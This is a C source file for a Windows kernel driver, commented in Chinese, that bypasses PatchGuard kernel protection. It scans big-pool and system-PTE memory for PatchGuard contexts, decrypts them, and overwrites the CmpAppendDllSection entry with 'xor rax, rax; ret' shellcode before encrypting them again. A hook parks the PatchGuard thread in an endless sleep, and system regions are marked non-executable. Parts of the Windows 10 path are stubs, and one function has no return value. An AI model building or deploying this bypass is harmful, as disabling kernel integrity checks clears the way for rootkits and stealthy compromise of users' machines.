#include "PassPatchGuard.h"
#include "Asm.h"

// 定义操作系统版本
#define WINXP 51
#define WIN7  61
#define WIN8  62
#define WIN10 100

// Win7 的页目录随机基址是固定的, 但Win10不是
ULONG64 g_NT_BASE;
ULONG64 g_PTE_BASE;
ULONG64 g_PDE_BASE;
ULONG64 g_PPE_BASE;
ULONG64 g_PXE_BASE;


PULONG64 GetPxeAddress(PVOID addr)
{
	// 1个 PXE 对应 512 GB
	return (PULONG64)(((((ULONG64)addr & 0xFFFFFFFFFFFF) >> 39) << 3) + g_PXE_BASE);
}

PULONG64 GetPpeAddress(PVOID addr)
{
	// 1个 PDPTE 对应 1 GB
	return (PULONG64)(((((ULONG64)addr & 0xFFFFFFFFFFFF) >> 30) << 3) + g_PPE_BASE);
}

PULONG64 GetPdeAddress(PVOID addr)
{
	// 1个 PDE 对应 2 MB
	return (PULONG64)(((((ULONG64)addr & 0xFFFFFFFFFFFF) >> 21) << 3) + g_PDE_BASE);
}

PULONG64 GetPteAddress(PVOID addr)
{
	// 1个 PTE 对应 4KB
	return (PULONG64)(((((ULONG64)addr & 0xFFFFFFFFFFFF) >> 12) << 3) + g_PTE_BASE);
}
ULONG GetWindowsVersion()
{
	RTL_OSVERSIONINFOW lpVersionInformation = { sizeof(RTL_OSVERSIONINFOW) };
	if (NT_SUCCESS(RtlGetVersion(&lpVersionInformation)))
	{
		ULONG dwMajorVersion = lpVersionInformation.dwMajorVersion;
		ULONG dwMinorVersion = lpVersionInformation.dwMinorVersion;
		if (dwMajorVersion == 5 && dwMinorVersion == 1)
		{
			return WINXP;
		}
		else if (dwMajorVersion == 6 && dwMinorVersion == 1)
		{
			return WIN7;
		}
		else if (dwMajorVersion == 6 && dwMinorVersion == 2)
		{
			return WIN8;
		}
		else if (dwMajorVersion == 10 && dwMinorVersion == 0)
		{
			return WIN10;
		}
	}
	return -1;
}

VOID EnumSysRegions();
// Dpc 回调
VOID PassPG_DpcRoutine(
	_In_ struct _KDPC *Dpc,
	_In_opt_ PVOID DeferredContext,
	_In_opt_ PVOID SystemArgument1,
	_In_opt_ PVOID SystemArgument2
)
{
	KdPrint(("PassPG_DpcRoutine 运行\n"));

	NTSTATUS dwStatus = STATUS_SUCCESS;

	// Dpc 中防止线程切换
	dwStatus = SearchPatchGuardContext();
	if (NT_SUCCESS(dwStatus))
	{
		KdPrint(("SearchPatchGuardContext Success!\n"));
	}

	KeSignalCallDpcSynchronize(SystemArgument2);
	KeSignalCallDpcDone(SystemArgument1);
}

BOOLEAN GetNtInformationEx()
{
	size_t dwIndex = 0;;
	ULONG dwNeedLen = 0;
	SYSTEM_MODULE_INFO_LIST* pSysModuleInfoList = NULL;
	PCHAR dwKernelBase = NULL;
	ULONG dwKernelBaseSize = 0;

	// 功能号为11，先获取所需的缓冲区大小
	ZwQuerySystemInformation(SystemModuleInformation, NULL, dwNeedLen, &dwNeedLen);
	// 申请内存
	pSysModuleInfoList = (SYSTEM_MODULE_INFO_LIST*)ExAllocatePoolWithTag(NonPagedPool, dwNeedLen, 'ioMm');
	// 再次调用
	ZwQuerySystemInformation(SystemModuleInformation, pSysModuleInfoList, dwNeedLen, &dwNeedLen);

	if (strstr(_strlwr(pSysModuleInfoList->smi[0].ImageName), "nt") != NULL)
	{
		// 获取内核模块基地址
		g_NT_BASE = (ULONG64)pSysModuleInfoList->smi[0].Base;
	}

	ExFreePoolWithTag(pSysModuleInfoList, 'ioMm');

	return (g_NT_BASE) ? TRUE : FALSE;
}

// 开始绕过 PG
NTSTATUS StartPassPatchGuard()
{
	// 判断系统版本
	if (GetWindowsVersion() == WIN7)
	{
		// Win7 的页目录随机基址是固定的
		g_PTE_BASE = 0xFFFFF68000000000;
		g_PDE_BASE = 0xFFFFF6FB40000000;
		g_PPE_BASE = 0xFFFFF6FB7DA00000;
		g_PXE_BASE = 0xFFFFF6FB7DBED000;
	}
	else if (GetWindowsVersion() == WIN10) {
		// Win10需要动态获取
		g_PTE_BASE = *(PULONG64)((ULONG64)MmGetVirtualForPhysical + 0x22);
		g_PDE_BASE = (g_PTE_BASE + ((g_PTE_BASE & 0xffffffffffff) >> 9));
		g_PPE_BASE = (g_PTE_BASE + ((g_PDE_BASE & 0xffffffffffff) >> 9));
		g_PXE_BASE = (g_PTE_BASE + ((g_PPE_BASE & 0xffffffffffff) >> 9));
	}

	GetNtInformationEx();

	NTSTATUS dwStatus = STATUS_SUCCESS;

	// 插入 DPC 结构体
	//PKDPC dwDpc = (PKDPC)sfExAllocate(sizeof(KDPC));
	//RtlZeroMemory(dwDpc, sizeof(KDPC));
	//KeInitializeDpc(dwDpc, PassPG_DpcRoutine, NULL);
	//KeInsertQueueDpc(dwDpc, NULL, NULL);

	KeGenericCallDpc(PassPG_DpcRoutine, NULL);

	return dwStatus;
}

// 搜索 PG Context
NTSTATUS SearchPatchGuardContext()
{
	KIRQL CurrentIrql = KeGetCurrentIrql();
	if (CurrentIrql == DISPATCH_LEVEL) {
		KeLowerIrql(PASSIVE_LEVEL);
	}
	
	KdBreakPoint();

	EnumSysRegions();
	PSYSTEM_BIGPOOL_INFORMATION pBigPoolInfo;
	ULONG64 ReturnLength = 0;
	NTSTATUS status = STATUS_SUCCESS;
	int num = 1;

	pBigPoolInfo = (PSYSTEM_BIGPOOL_INFORMATION)ExAllocatePool(NonPagedPool, sizeof(SYSTEM_BIGPOOL_INFORMATION));
	// 获取需要的 BigPoolInfo 内存大小
	status = 
		ZwQuerySystemInformation(0x42/*SystemBigPoolInformation*/, pBigPoolInfo, sizeof(SYSTEM_BIGPOOL_INFORMATION), &ReturnLength);
	ExFreePool(pBigPoolInfo);
	pBigPoolInfo = (PSYSTEM_BIGPOOL_INFORMATION)ExAllocatePool(NonPagedPool, ReturnLength + 0x1000);
	if (!pBigPoolInfo)
	{
		return STATUS_UNSUCCESSFUL;
	}

	// 获取当前 NonPagedPool 内存信息
	status = ZwQuerySystemInformation(0x42, pBigPoolInfo, ReturnLength + 0x1000, &ReturnLength);
	if (status != STATUS_SUCCESS)
	{
		DbgPrint("Query BigPoolInfo failed: %p\n", status);
		ExFreePool(pBigPoolInfo);
		return status;
	}

	for (ULONG i = 0; i < pBigPoolInfo->Count; i++)
	{
		PVOID addr = pBigPoolInfo->AllocatedInfo[i].VirtualAddress;
		ULONG64 size = (ULONG64)pBigPoolInfo->AllocatedInfo[i].SizeInBytes;
		BOOLEAN nonPaged = (BOOLEAN)pBigPoolInfo->AllocatedInfo[i].NonPaged;
		PULONG64 ppte = (PULONG64)GetPteAddress(addr);
		ULONG64 pte = *ppte; // 获取 pte
		PULONG64 ppde = (PULONG64)GetPdeAddress(addr);
		ULONG64 pde = *ppde; // 获取 pde


		if (size >= 0x10000/*0x8000*/) // 一般 PG Context 是大于 0x8000 的
		{
			if (!nonPaged && (pBigPoolInfo == addr))
			{
				// 不为 NonPagedPool And 排除 pBigPoolInfo 内存
				continue;
			}

			// Windows 7 PG Context 是存储在大页上的
			if (pde & 0x80) {
				// 如果为大页
				if ((pde & 0x8000000000000000) == 0 && (pde & 1))
				{
					// 判断是否为 PG Context
					if (PatchGuardCmpDecryByXor(addr, size))
					{
						// 可执行，且 PDE 存在
						DbgPrint("[%d]addr: [%p], size: [%p], pde: [%p]\n", num, addr, size, pde);

						num += 1;
					}
				}
			}
			// Windows 10 PG Context 是存储在大页上的
			else if ((pte & 0x8000000000000000) == 0 && (pte & 1)) { 
				
				// 可执行，且 PTE 存在, 改为不可执行
				//pte |= 0x8000000000000000;
				//*ppte = pte;
				
				// 判断是否为 PG Context
				//if (PatchGuardCmpDecryByXorWin10(addr, size))
				//{
					//DbgPrint("[%d]addr: [%p], size: [%p], pte: [%p]\n", num, addr, size, pte);
					//num += 1;
				//}						
			}
		}
	}

	DbgPrint("num %d\n", num);
	ExFreePool(pBigPoolInfo);

	if (CurrentIrql == DISPATCH_LEVEL) {
		KeRaiseIrqlToDpcLevel(); // 提升 IRQL 等级为 DISPATCH_LEVEL
	}

	return status;
}

// PG Context CmpAppendDllSection 算法碰撞
// 判断是否为 CmpAppendDllSection 函数
BOOLEAN PatchGuardCmpDecryByXor(PVOID addr, size_t size)
{
	BOOLEAN dwFalg = FALSE;
	CHAR * dwMmaddr = (CHAR *)addr;

	// Win7 上的 PG Context 只是一层异或算法
	for (size_t i = 0; i < size; i++)
	{

		// 假 Key
		ULONG_PTR TempKey = (*(ULONG_PTR *)(dwMmaddr + i + 0x78)) ^ 0x31000000C0913148;

		// 定位入口点
		if ((*(ULONG_PTR*)(dwMmaddr + i + 0x78 + 0x08) ^ 0x8BD18B48C28B4811) == TempKey &&
			(*(ULONG_PTR*)(dwMmaddr + i + 0x78 + 0x10) ^ 0x843148000000C48A) == TempKey &&
			(*(ULONG_PTR*)(dwMmaddr + i + 0x78 + 0x18) ^ 0xC8D348000000C0CA) == TempKey)
		{
			//以上条件满足说明找到了密文，我们来接着找contextkey进行解密
			ULONG_PTR ContextKey = TempKey;
			ULONG_PTR ContextSizeOfBytes = (((*(ULONG_PTR*)(dwMmaddr + i + 0xc0)) ^ ContextKey) >> 32) * 0x8;
			// context + 0xc4是保存从 + 0xc8偏移context后面整个加密长度(换算成字节乘以0x8), 注意只有4字节
			ContextSizeOfBytes += 0xC8; //加上前面的长度 == PG Context 的大小

			KdPrint(("ContextKey:%p ContextSizeOfBytes:%x\n", ContextKey, ContextSizeOfBytes));

			if ((i + ContextSizeOfBytes) <= size)
			{
				PatchGuardEncryptCode(dwMmaddr + i, ContextKey, ContextSizeOfBytes);
			}
			
			dwFalg = TRUE;
			return dwFalg;
		}

	}

	return dwFalg;
}

BOOLEAN PatchGuardCmpDecryByXorWin10(PVOID addr, size_t size)
{
	//SeLocateProcessImageName();
}

// PG Context 算法碰撞
VOID PatchGuardEncryptCode(
	PUCHAR Context/* PG 起始地址 */, 
	ULONG_PTR ContextKey/* 当前 PG Key */, 
	ULONG_PTR ContextSizeOfBytes/* PG Context 的大小 */)
{
	PULONG_PTR pTempMem = (PULONG_PTR)(ExAllocatePool(NonPagedPool, ContextSizeOfBytes));
	RtlCopyMemory(pTempMem, Context, ContextSizeOfBytes);

	//首先解密出context头部的CmpAppendDllSection解密函数
	for (auto i = 0; i < 0xC8 / sizeof(ULONG_PTR); i++)
	{
		pTempMem[i] ^= ContextKey;
	}
	ULONG_PTR FollowContextSize = pTempMem[0xC0 / sizeof(ULONG_PTR)] >> 32;
	ULONG_PTR TempSize = FollowContextSize;
	ULONG_PTR FollowContextKey = ContextKey;

	//解密剩下的部分
	do {
		pTempMem[(0xC0 / sizeof(ULONG_PTR)) + TempSize] ^= FollowContextKey;
		UCHAR RorBit = (UCHAR)(TempSize);
		FollowContextKey = __ROR64(FollowContextKey, RorBit);
		//FollowContextKey = __BTC64(FollowContextKey); //Win10 1809
	} while (--TempSize);
	
	//以上解密完成，我们接下去修改context内容
	UCHAR* TempContext = (UCHAR*)(pTempMem);
	for (auto i = 0; i < ContextSizeOfBytes; i++)
	{
		if ((i + 0x84 + 0x16) < ContextSizeOfBytes && \
			memcmp(TempContext + i + 0x84,
				"\x48\x8B\xD1\x8B\x8A\xC4\x00\x00\x00\x48\x31\x84\xCA\xC0\x00\x00\x00\x48\xD3\xC8\xE2\xF3", 0x16) == 0)
		{
			// xor rax, rax; ret; 入口直接返回
			CHAR ShellCode[0x8] = {
				0x48, 0x31, 0xC0, // xor rax, rax
				0xC3,			  // ret
				0x90, 0x90, 0x90, 0x90 // 指令对齐
			};
			RtlMoveMemory((PVOID)(TempContext + i + 0x8), ShellCode, 0x8);

			DbgPrint(" -- CmpAppendDllSection address:%p", TempContext + i);
			DbgPrint(" -- CmpAppendDllSection address content:%p", *(ULONG_PTR*)(TempContext + i + 8));
		}
	}
	//头加密回去
	for (auto i = 0; i < 0xC8 / sizeof(ULONG_PTR); i++)
	{
		pTempMem[i] ^= ContextKey;
	}
	TempSize = FollowContextSize;
	FollowContextKey = ContextKey;
	//尾加密回去
	do {
		pTempMem[(0xC0 / sizeof(ULONG_PTR)) + TempSize] ^= FollowContextKey;
		UCHAR RorBit = (UCHAR)(TempSize);
		FollowContextKey = __ROR64(FollowContextKey, RorBit);
	} while (--TempSize);

	RtlCopyMemory(Context, pTempMem, ContextSizeOfBytes);
	ExFreePool(pTempMem);
}

// 拦截 PG 执行
ULONG_PTR HookExecPatchGuard(ULONG_PTR Unuse, ULONG_PTR Context)
{
	KdBreakPoint();
	// 线程直接睡眠24小时
	LARGE_INTEGER timeOut = RtlConvertLongToLargeInteger(-10 * 1000 * 1000 * 60 * 60 * 24);
	while (TRUE)
	{
		// 直接让PG线程进入睡眠
		KeDelayExecutionThread(KernelMode, FALSE, &timeOut);
	}
}

PVOID GetVirtualAddressMappedByPte(PMMPTE pte)
{
	return (PVOID)(((((ULONG64)pte - g_PTE_BASE) >> 3) << 12) | 0xffff000000000000);
}
PVOID GetVirtualAddressMappedByPde(PMMPTE pde)
{
	return (PVOID)(((((ULONG64)pde - g_PDE_BASE) >> 3) << 21) | 0xffff000000000000);
}
PVOID GetVirtualAddressMappedByPpe(PMMPTE ppe)
{
	return (PVOID)(((((ULONG64)ppe - g_PPE_BASE) >> 3) << 30) | 0xffff000000000000);
}
PVOID GetVirtualAddressMappedByPxe(PMMPTE pxe)
{
	return (PVOID)(((((ULONG64)pxe - g_PXE_BASE) >> 3) << 39) | 0xffff000000000000);
}
VOID InitializeSystemPtesBitMap(
	__inout PMMPTE BasePte,
	__in PFN_NUMBER NumberOfPtes,
	__out PRTL_BITMAP BitMap
)
{
	PMMPTE PointerPxe = NULL;
	PMMPTE PointerPpe = NULL;
	PMMPTE PointerPde = NULL;
	PMMPTE PointerPte = NULL;
	PVOID PointerAddress = NULL;
	ULONG BitNumber = 0;
	PVOID BeginAddress = NULL;
	PVOID EndAddress = NULL;

	/*
	PatchGuard Context pages allocate by MmAllocateIndependentPages
	*/

#define VALID_PTE_SET_BITS \
            ( MM_PTE_VALID_MASK | MM_PTE_DIRTY_MASK | MM_PTE_WRITE_MASK | MM_PTE_ACCESS_MASK)

#define VALID_PTE_UNSET_BITS \
            ( MM_PTE_WRITE_THROUGH_MASK | MM_PTE_CACHE_DISABLE_MASK | MM_PTE_COPY_ON_WRITE_MASK )

	BeginAddress = GetVirtualAddressMappedByPte(BasePte);
	//    __debugbreak();
	EndAddress = GetVirtualAddressMappedByPte(BasePte + NumberOfPtes);

	PointerAddress = BeginAddress;

	do {
		PointerPxe = (PMMPTE)GetPxeAddress(PointerAddress);

		if (0 != PointerPxe->u.Hard.Valid) {
			PointerPpe = (PMMPTE)GetPpeAddress(PointerAddress);

			if (0 != PointerPpe->u.Hard.Valid) {
				PointerPde = (PMMPTE)GetPdeAddress(PointerAddress);

				if (0 != PointerPde->u.Hard.Valid) {
					if (0 == PointerPde->u.Hard.LargePage) {
						PointerPte = (PMMPTE)GetPteAddress(PointerAddress);

						if (0 != PointerPte->u.Hard.Valid) {
							if (0 == PointerPte->u.Hard.NoExecute) {
								if (VALID_PTE_SET_BITS == (PointerPte->u.Long & VALID_PTE_SET_BITS)) {
									if (0 == (PointerPte->u.Long & VALID_PTE_UNSET_BITS)) {
										BitNumber = (ULONG)(PointerPte - BasePte);
										RtlSetBit(BitMap, BitNumber);
									}
								}
							}
						}

						PointerAddress = GetVirtualAddressMappedByPte(PointerPte + 1);
					}
					else {
						PointerAddress = GetVirtualAddressMappedByPde(PointerPde + 1);
					}
				}
				else {
					PointerAddress = GetVirtualAddressMappedByPde(PointerPde + 1);
				}
			}
			else {
				PointerAddress = GetVirtualAddressMappedByPpe(PointerPpe + 1);
			}
		}
		else {
			PointerAddress = GetVirtualAddressMappedByPxe(PointerPxe + 1);
		}
	} while ((ULONG_PTR)PointerAddress < (ULONG_PTR)EndAddress);
}
VOID EnumSysRegions()
{
	PMMPTE BasePte;
	PFN_NUMBER NumberOfPtes;
	ULONG BitMapSize;
	ULONG64 system_pte_strc;
	PRTL_BITMAP BitMap;
	ULONG HintIndex = 0;
	ULONG StartingRunIndex = 0;
	PVOID BaseAddress;
	ULONG64 RegionSize;
	system_pte_strc = 0x43BF20 + g_NT_BASE;
	DbgPrint("system_pte_strc: %p", system_pte_strc);
	BasePte = (PMMPTE)*(PULONG64)(system_pte_strc + 0x10);
	NumberOfPtes = *(PULONG64)(system_pte_strc) * 8;
	BitMapSize =
		sizeof(RTL_BITMAP) + (ULONG)((((NumberOfPtes + 1) + 31) / 32) * 4);

	BitMap = (PRTL_BITMAP)ExAllocatePoolWithTag(NonPagedPool, BitMapSize, 'BMP');
	RtlInitializeBitMap(
		BitMap,
		(PULONG)(BitMap + 1),
		(ULONG)(NumberOfPtes + 1));
	RtlClearAllBits(BitMap);
	InitializeSystemPtesBitMap(
		BasePte,
		NumberOfPtes,
		BitMap);
	
	do {
		HintIndex = RtlFindSetBits(
			BitMap,
			1,
			HintIndex);

		if (MAXULONG != HintIndex) {
			RtlFindNextForwardRunClear(
				BitMap,
				HintIndex,
				&StartingRunIndex);

			RtlClearBits(BitMap, HintIndex, StartingRunIndex - HintIndex);


			BaseAddress =
				GetVirtualAddressMappedByPte(BasePte + HintIndex);
			RegionSize =
				(SIZE_T)(StartingRunIndex - HintIndex) * 0x1000;

			if (RegionSize > 0x10000) {
				DbgPrint(
					"found region in system ptes < %p - %08x >\n",
					BaseAddress,
					RegionSize);
				/*****************handle it*****************/
				((PMMPTE)GetPpeAddress(BaseAddress))->u.Long |= 0x8000000000000000;
			}

			HintIndex = StartingRunIndex;
		}
	} while (HintIndex < NumberOfPtes);

	ExFreePool(BitMap);
}